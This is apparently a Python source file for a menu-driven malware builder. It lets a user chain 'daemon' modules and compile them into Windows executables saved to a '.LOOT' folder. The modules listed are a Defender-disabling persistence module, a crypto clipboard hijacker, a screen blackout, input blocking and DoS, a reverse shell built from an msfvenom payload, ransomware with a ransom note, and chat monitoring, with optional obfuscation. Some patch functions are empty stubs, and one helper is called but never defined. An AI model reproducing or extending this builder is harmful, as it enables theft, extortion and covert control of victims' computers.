import sys
sys.dont_write_bytecode = True
import os
import subprocess
import readline
from loading import clear_screen
import fileinput
import base64

MODULES = {
    'daemon/hellhound': {'desc': 'Gains persistence and disables Defender protections'},
    'daemon/gremlin': {'desc': 'Hijacks clipboard crypto addresses'},
    'daemon/blackice': {'desc': 'Blacks out the screen to disrupt user activity'},
    'daemon/logicbomb': {'desc': 'Blocks input and triggers DoS on the target'},
    'daemon/flatline': {'desc': 'Provides a reverse shell for remote access'},
    'daemon/krash': {'desc': 'Wipes data and crashes the system using ransomware'},
    'daemon/overwatch': {'desc': 'Monitors all victims chats'},
}

MODULE_CHAIN = []

BUILD_OPTIONS = {
    'exe_name': 'payload.exe',
    'obfuscate': False,
}

MODULE_OPTIONS = {
    'daemon/hellhound': {
        'PERSISTENCE': 'true',
        'DEFENDER_EXCLUDE': 'true',
    },
    'daemon/gremlin': {
        'BTC_ADDRESS': '1BitcoinPredefinedAddressExample1234',
        'ETH_ADDRESS': '0xEthereumPredefinedAddress1234567890abcdef',
        'BEP20_ADDRESS': '0xBEP20PredefinedAddress1234567890abcdef',
        'SOL_ADDRESS': 'So1anaPredefinedAddressExample1234567890',
    },
    'daemon/blackice': {
        'DURATION': '60',
    },
    'daemon/logicbomb': {
        'BLOCK_INPUT': 'true',
        'TRIGGER_DELAY': '10',
    },
    'daemon/flatline': {
        'LHOST': '0.0.0.0',
        'LPORT': '4444',
        'KEY': 'changeme',
    },
    'daemon/krash': {
        'NOTE': 'Your ransom note here',
    },
    'daemon/overwatch': {},
}

COMMANDS = ['use', 'build', 'clear', 'delete', 'show modules', 'show options', 'exit', 'set']

YELLOW = "\033[93m"
RED = "\033[91m"
GREEN = "\033[92m"
PINK = "\033[38;2;224;147;217m"
RESET = "\033[0m"

ASCII_ART = f'''
                                                -----
                                              /      \
                                          
       {RED}:================:{RESET}                     "    )/
      {RED}/||              ||{RESET}                      )_ /*
     {RED}/ ||    {PINK}System{RESET}    {RED}||{RESET}                           *
    {RED}|  ||     {PINK}Down{RESET}     {RED}||{RESET}                    (=====~*~======)
     {RED}\\ || {PINK} Please wait{RESET} {RED}||{RESET}                   0      \\ /       0
       {RED}=================={RESET}                //   (====*====)   ||
{RED}........... /      \\.............{RESET}      //         *         ||
{RED}:\\        ############            \\{RESET}    ||    (=====*======)  ||
{RED}: --------------------------------- {RESET}    V          *          V
{RED}: |  *   |__________|| ::::::::::  |{RESET}     o   (======*=======) o
{RED}\\ |      |          ||   .......   |{RESET}     \\         *         ||
{RED}  --------------------------------- 8{RESET}    ||   (=====*======)  //
{RED}                                     8{RESET}    V         *         V
{RED}  --------------------------------- 8{RESET}    =|=;  (==/ * \\==)   =|=
{RED}  \\   ###########################  \\{RESET}    / ! \\     _ * __    / | \\
{RED}   \\  +++++++++++++++++++++++++++   \\{RESET}   ! !  !  (__/ \\__)  !  !  !
{RED}    \\ ++++++++++++++++++++++++++++   \\{RESET}         0 \\ \\V/ / 0
{RED}     \\________________________________\\{RESET}      ()   \\o o/   ()
{RED}      *********************************{RESET}      ()           ()
'''

def print_ascii_art():
    print(ASCII_ART)

def print_selected_modules():
    if MODULE_CHAIN:
        print("Selected modules:")
        for idx, mod in enumerate(MODULE_CHAIN, 1):
            print(f"  {idx} -> {PINK}{mod}{RESET}")
    else:
        print("No modules selected.")

def print_ui():
    clear_screen()
    print_ascii_art()
    print_selected_modules()
    print()

def get_module_names():
    return list(MODULES.keys())

def shell_completer(text, state):
    buffer = readline.get_line_buffer()
    line = buffer.split()
    if not line:
        opts = COMMANDS + get_module_names()
    elif line[0] == 'use':
        opts = [m for m in get_module_names() if m.startswith(text)]    
    else:
        opts = [c for c in COMMANDS if c.startswith(text)]
    if state < len(opts):
        return opts[state] + ' '
    return None

def print_modules():
    print("\nAvailable modules:")
    print(f"{'Module':<25} | Description")
    print("-"*60)
    for name, info in MODULES.items():
        print(f"{name:<25} | {info.get('desc', '')}")
    print()

def print_global_options():
    print(f"{'Option':<15} | Value")
    print("-"*30)
    for k, v in BUILD_OPTIONS.items():
        print(f"{k:<15} | {v}")
    print()

def print_module_options(module):
    opts = MODULE_OPTIONS.get(module)
    if not opts:
        print(f"No options for module: {module}")
        return
    print(f"{'Option':<15} | Value")
    print("-"*30)
    for k, v in opts.items():
        print(f"{k:<15} | {v}")
    print()

def print_options():
    print(f"{'Option':<15} | Value")
    print("-"*30)
    for k, v in BUILD_OPTIONS.items():
        print(f"{k:<15} | {v}")
    print()

def colorize_message(msg):
    lower = msg.lower()
    if any(word in lower for word in ["fail", "error", "unknown", "no modules to remove", "usage"]):
        return f"{RED}{msg}{RESET}"
    elif any(word in lower for word in ["final merged exe", "single module built", "set ", "removed module", "all selected modules cleared", "using module"]):
        return f"{GREEN}{msg}{RESET}"
    else:
        return f"{YELLOW}{msg}{RESET}"

def patch_krash_note(note):
    go_path = os.path.join('DAEMONS', 'krash.go')
    with open(go_path, 'r') as f:
        lines = f.readlines()
    with open(go_path, 'w') as f:
        for line in lines:
            if 'message := ' in line and 'YOUR NOTE HERE' in line:
                f.write(f'    message := "{note}\\n"\n')
            else:
                f.write(line)
    return lines

def restore_krash_go(original_lines):
    go_path = os.path.join('DAEMONS', 'krash.go')
    with open(go_path, 'w') as f:
        f.writelines(original_lines)

def patch_flatline_base64(exe_path):
    go_path = os.path.join('DAEMONS', 'flatline.go')
    with open(exe_path, 'rb') as f:
        b64 = base64.b64encode(f.read()).decode()
    with open(go_path, 'r') as f:
        lines = f.readlines()
    with open(go_path, 'w') as f:
        for line in lines:
            if 'base64String :=' in line:
                f.write(f'    base64String := "{b64}"\n')
            else:
                f.write(line)
    return lines 

def restore_flatline_go(original_lines):
    go_path = os.path.join('DAEMONS', 'flatline.go')
    with open(go_path, 'w') as f:
        f.writelines(original_lines)

def patch_hellhound_options(persistence, defender_exclude):
    return None

def restore_hellhound_go(original_lines):
    pass

def patch_gremlin_addresses(btc_address, eth_address, bep20_address, sol_address):
    return None

def restore_gremlin_go(original_lines):
    pass

def patch_blackice_options(duration):
    return None

def restore_blackice_go(original_lines):
    pass

def patch_logicbomb_options(block_input, trigger_delay):
    return None

def restore_logicbomb_go(original_lines):
    pass

def patch_flatline_options(lhost, lport, key):
    return None

def restore_flatline_go(original_lines):
    pass

def patch_overwatch_options():
    return None

def restore_overwatch_go(original_lines):
    pass

def shell():
    current_module = None
    readline.set_completer(shell_completer)
    readline.parse_and_bind('tab: complete')
    output_lines = []
    while True:
        try:
            print_ui()
            if output_lines:
                for line in output_lines:
                    print(colorize_message(line))
            prompt_num = len(MODULE_CHAIN) + 1
            prompt = f"{PINK}{prompt_num} * > {RESET}"
            print()
            cmdline = input(prompt)
            parts = cmdline.strip().split()
            output_lines = []
            if not parts:
                continue
            cmd = parts[0].lower()
            if cmd == 'use':
                if len(parts) < 2:
                    output_lines.append("Usage: use <module>")
                else:
                    modname = parts[1]
                    if modname not in MODULES:
                        output_lines.append(f"Unknown module: {modname}")
                    elif modname in MODULE_CHAIN:
                        output_lines.append(f"Module already selected: {modname}")
                    else:
                        current_module = modname
                        output_lines.append(f"Using module: {current_module}")
                        MODULE_CHAIN.append(current_module)
            elif cmd == 'build':
                if not MODULE_CHAIN:
                    output_lines.append("No modules in chain. Use 'use <module>' to add modules.")
                else:
                    loot_dir = os.path.abspath(os.path.join(os.getcwd(), '.LOOT'))
                    os.makedirs(loot_dir, exist_ok=True)
                    
                    if len(MODULE_CHAIN) == 1:
                        modname = MODULE_CHAIN[0]
                        output_lines.append(f"Building single module: {modname}")
                        
                        go_path = modname.replace('daemon/', 'DAEMONS/') + '.go'
                        krash_original = None
                        flatline_original = None
                        hellhound_original = None
                        gremlin_original = None
                        blackice_original = None
                        logicbomb_original = None
                        overwatch_original = None
                        
                        if modname == 'daemon/krash':
                            note = MODULE_OPTIONS.get('daemon/krash', {}).get('NOTE', 'YOUR NOTE HERE')
                            krash_original = patch_krash_note(note)
                        elif modname == 'daemon/flatline':
                            opts = MODULE_OPTIONS.get('daemon/flatline', {})
                            lhost = opts.get('LHOST', '0.0.0.0')
                            lport = opts.get('LPORT', '4444')
                            payload_path = os.path.join('.LOOT', 'flatline_payload.exe')
                            try:
                                generate_msfvenom_exe(lhost, lport, payload_path)
                            except Exception as e:
                                output_lines.append(f"Failed to generate msfvenom payload: {e}")
                                continue
                            flatline_original = patch_flatline_base64(payload_path)
                        elif modname == 'daemon/hellhound':
                            opts = MODULE_OPTIONS.get('daemon/hellhound', {})
                            persistence = opts.get('PERSISTENCE', 'true')
                            defender_exclude = opts.get('DEFENDER_EXCLUDE', 'true')
                            hellhound_original = patch_hellhound_options(persistence, defender_exclude)
                        elif modname == 'daemon/gremlin':
                            opts = MODULE_OPTIONS.get('daemon/gremlin', {})
                            btc_address = opts.get('BTC_ADDRESS', '1BitcoinPredefinedAddressExample1234')
                            eth_address = opts.get('ETH_ADDRESS', '0xEthereumPredefinedAddress1234567890abcdef')
                            bep20_address = opts.get('BEP20_ADDRESS', '0xBEP20PredefinedAddress1234567890abcdef')
                            sol_address = opts.get('SOL_ADDRESS', 'So1anaPredefinedAddressExample1234567890')
                            gremlin_original = patch_gremlin_addresses(btc_address, eth_address, bep20_address, sol_address)
                        elif modname == 'daemon/blackice':
                            opts = MODULE_OPTIONS.get('daemon/blackice', {})
                            duration = opts.get('DURATION', '60')
                            blackice_original = patch_blackice_options(duration)
                        elif modname == 'daemon/logicbomb':
                            opts = MODULE_OPTIONS.get('daemon/logicbomb', {})
                            block_input = opts.get('BLOCK_INPUT', 'true')
                            trigger_delay = opts.get('TRIGGER_DELAY', '10')
                            logicbomb_original = patch_logicbomb_options(block_input, trigger_delay)
                        elif modname == 'daemon/overwatch':
                            overwatch_original = patch_overwatch_options()
                        
                        module_name = modname.split('/')[-1]
                        final_name = f"{module_name}.exe"
                        final_path = os.path.abspath(os.path.join(loot_dir, final_name))
                        
                        output_lines.append(f"[*] Building single module: {final_name}")
                        obf_flag = []
                        if BUILD_OPTIONS.get('obfuscate'):
                            obf_flag = ['--obfuscate']
                        
                        from loading import loading_state
                        with loading_state(message="Building, please wait...", print_ascii_art=print_ascii_art):
                            result = subprocess.run([sys.executable, 'compiler.py', '--go_file', go_path, '--output_exe', final_name] + obf_flag)
                        
                        if result.returncode == 0:
                            output_lines.append(f"Single module built: {final_path}")
                        else:
                            output_lines.append("Failed to create single module EXE.")
                        
                        if krash_original:
                            restore_krash_go(krash_original)
                        if flatline_original:
                            restore_flatline_go(flatline_original)
                        if hellhound_original:
                            restore_hellhound_go(hellhound_original)
                        if gremlin_original:
                            restore_gremlin_go(gremlin_original)
                        if blackice_original:
                            restore_blackice_go(blackice_original)
                        if logicbomb_original:
                            restore_logicbomb_go(logicbomb_original)
                        if overwatch_original:
                            restore_overwatch_go(overwatch_original)
                        
                        MODULE_CHAIN.clear()
                    else:
                        output_lines.append(f"Building merged malware with {len(MODULE_CHAIN)} modules...")
                        go_paths = []
                        krash_original = None
                        flatline_original = None
                        hellhound_original = None
                        gremlin_original = None
                        blackice_original = None
                        logicbomb_original = None
                        overwatch_original = None
                        for modname in MODULE_CHAIN:
                            go_path = modname.replace('daemon/', 'DAEMONS/') + '.go'
                            if modname == 'daemon/krash':
                                note = MODULE_OPTIONS.get('daemon/krash', {}).get('NOTE', 'YOUR NOTE HERE')
                                krash_original = patch_krash_note(note)
                            if modname == 'daemon/flatline':
                                opts = MODULE_OPTIONS.get('daemon/flatline', {})
                                lhost = opts.get('LHOST', '0.0.0.0')
                                lport = opts.get('LPORT', '4444')
                                payload_path = os.path.join('.LOOT', 'flatline_payload.exe')
                                try:
                                    generate_msfvenom_exe(lhost, lport, payload_path)
                                except Exception as e:
                                    output_lines.append(f"Failed to generate msfvenom payload: {e}")
                                    continue
                                flatline_original = patch_flatline_base64(payload_path)
                            if modname == 'daemon/hellhound':
                                opts = MODULE_OPTIONS.get('daemon/hellhound', {})
                                persistence = opts.get('PERSISTENCE', 'true')
                                defender_exclude = opts.get('DEFENDER_EXCLUDE', 'true')
                                hellhound_original = patch_hellhound_options(persistence, defender_exclude)
                            if modname == 'daemon/gremlin':
                                opts = MODULE_OPTIONS.get('daemon/gremlin', {})
                                btc_address = opts.get('BTC_ADDRESS', '1BitcoinPredefinedAddressExample1234')
                                eth_address = opts.get('ETH_ADDRESS', '0xEthereumPredefinedAddress1234567890abcdef')
                                bep20_address = opts.get('BEP20_ADDRESS', '0xBEP20PredefinedAddress1234567890abcdef')
                                sol_address = opts.get('SOL_ADDRESS', 'So1anaPredefinedAddressExample1234567890')
                                gremlin_original = patch_gremlin_addresses(btc_address, eth_address, bep20_address, sol_address)
                            if modname == 'daemon/blackice':
                                opts = MODULE_OPTIONS.get('daemon/blackice', {})
                                duration = opts.get('DURATION', '60')
                                blackice_original = patch_blackice_options(duration)
                            if modname == 'daemon/logicbomb':
                                opts = MODULE_OPTIONS.get('daemon/logicbomb', {})
                                block_input = opts.get('BLOCK_INPUT', 'true')
                                trigger_delay = opts.get('TRIGGER_DELAY', '10')
                                logicbomb_original = patch_logicbomb_options(block_input, trigger_delay)
                            if modname == 'daemon/overwatch':
                                overwatch_original = patch_overwatch_options()
                            go_paths.append(go_path)
                        final_name = BUILD_OPTIONS['exe_name']
                        final_path = os.path.abspath(os.path.join(loot_dir, final_name))
                        output_lines.append(f"[*] Merging Go modules into final EXE: {final_name}")
                        obf_flag = []
                        if BUILD_OPTIONS.get('obfuscate'):
                            obf_flag = ['--obfuscate']
                        from loading import loading_state
                        with loading_state(message="Building, please wait...", print_ascii_art=print_ascii_art):
                            result = subprocess.run([sys.executable, 'compiler.py', '--merge'] + go_paths + [final_path] + obf_flag)
                        if result.returncode == 0:
                            output_lines.append(f"Final merged EXE: {final_path}")
                        else:
                            output_lines.append("Failed to create merged EXE.")
                        if krash_original:
                            restore_krash_go(krash_original)
                        if flatline_original:
                            restore_flatline_go(flatline_original)
                        if hellhound_original:
                            restore_hellhound_go(hellhound_original)
                        if gremlin_original:
                            restore_gremlin_go(gremlin_original)
                        if blackice_original:
                            restore_blackice_go(blackice_original)
                        if logicbomb_original:
                            restore_logicbomb_go(logicbomb_original)
                        if overwatch_original:
                            restore_overwatch_go(overwatch_original)
                        MODULE_CHAIN.clear()
            elif cmd == 'clear':
                MODULE_CHAIN.clear()
                output_lines.append("All selected modules cleared.")
            elif cmd == 'delete':
                if MODULE_CHAIN:
                    removed = MODULE_CHAIN.pop()
                    output_lines.append(f"Removed module: {removed}")
                else:
                    output_lines.append("No modules to remove.")
            elif cmd == 'show':
                if len(parts) < 2:
                    output_lines.append("Usage: show <modules|options|global options>")
                else:
                    subcmd = parts[1].lower()
                    if subcmd == 'modules':
                        output_lines.append("")
                        output_lines.append(f"{'Module':<25} | Description")
                        output_lines.append("-"*60)
                        for name, info in MODULES.items():
                            output_lines.append(f"{name:<25} | {info.get('desc', '')}")
                    elif subcmd == 'global' and len(parts) > 2 and parts[2].lower() == 'options':
                        from io import StringIO
                        buf = StringIO()
                        buf.write(f"{'Option':<15} | Value\n")
                        buf.write("-"*30 + "\n")
                        for k, v in BUILD_OPTIONS.items():
                            buf.write(f"{k:<15} | {v}\n")
                        output_lines.append(buf.getvalue())
                    elif subcmd == 'options':
                        if MODULE_CHAIN:
                            mod = MODULE_CHAIN[-1]
                            opts = MODULE_OPTIONS.get(mod)
                            if not opts:
                                output_lines.append(f"No options for module: {mod}")
                            else:
                                buf = []
                                buf.append(f"{'Option':<15} | Value")
                                buf.append("-"*30)
                                for k, v in opts.items():
                                    buf.append(f"{k:<15} | {v}")
                                output_lines.extend(buf)
                        else:
                            output_lines.append("No module selected. Use 'use <module>' to select one.")
                    else:
                        output_lines.append(f"Unknown show command: {subcmd}")
            elif cmd == 'set':
                if len(parts) < 3:
                    output_lines.append("Usage: set <option> <value>")
                else:
                    opt = parts[1]
                    val = parts[2]
                    if MODULE_CHAIN:
                        mod = MODULE_CHAIN[-1]
                        if mod in MODULE_OPTIONS and opt in MODULE_OPTIONS[mod]:
                            MODULE_OPTIONS[mod][opt] = val
                            output_lines.append(f"Set {opt} to {val} for {mod}")
                        elif opt in BUILD_OPTIONS:
                            if opt == 'obfuscate':
                                BUILD_OPTIONS[opt] = val.lower() in ('1', 'true', 'yes', 'on')
                            else:
                                BUILD_OPTIONS[opt] = val
                            output_lines.append(f"Set {opt} to {BUILD_OPTIONS[opt]}")
                        else:
                            output_lines.append(f"Unknown option: {opt}")
                    else:
                        if opt in BUILD_OPTIONS:
                            if opt == 'obfuscate':
                                BUILD_OPTIONS[opt] = val.lower() in ('1', 'true', 'yes', 'on')
                            else:
                                BUILD_OPTIONS[opt] = val
                            output_lines.append(f"Set {opt} to {BUILD_OPTIONS[opt]}")
                        else:
                            output_lines.append(f"Unknown option: {opt}")
            elif cmd in ('exit', 'quit'):
                print_ui()
                print("Exiting...")
                print()
                break
            else:
                output_lines.append(f"Unknown command: {cmd}")
        except (KeyboardInterrupt, EOFError):
            print()
            continue

if __name__ == "__main__":
    shell() 